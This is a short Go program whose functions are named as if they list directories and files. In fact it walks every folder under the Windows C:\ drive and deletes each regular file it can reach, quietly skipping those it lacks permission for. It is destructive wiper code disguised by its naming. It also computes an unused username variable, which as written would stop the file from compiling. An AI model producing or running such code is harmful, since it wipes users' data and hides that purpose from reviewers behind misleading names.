package main

import (
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

func ListDirs(dirName string) {

	entries, err := os.ReadDir(dirName)
	if err != nil {
		return
	}

	for _, entry := range entries {
		if entry.IsDir() {
			subDir := filepath.Join(dirName, entry.Name())
			ListFiles(subDir)
			ListDirs(subDir)
		}
	}

}

func ListFiles(dirPath string) {
	entries, err := os.ReadDir(dirPath)
	if err != nil {
		return
	}

	for _, entry := range entries {
		if entry.Type().IsRegular() {
			err := os.Remove(filepath.Join(dirPath, entry.Name()))
			if err != nil {
				if os.IsPermission(err) {
					continue
				}
			}
		}
	}
}

func getSimpleUserName(fullName string) string {
	parts := strings.Split(fullName, `\`)
	return parts[len(parts)-1]
}

func main() {

	// Get current user
	currentUser, err := user.Current()
	if err != nil {
		panic(err)
	}

	username := getSimpleUserName(currentUser.Username)
	var root string = `C:\`
	ListDirs(root)
}


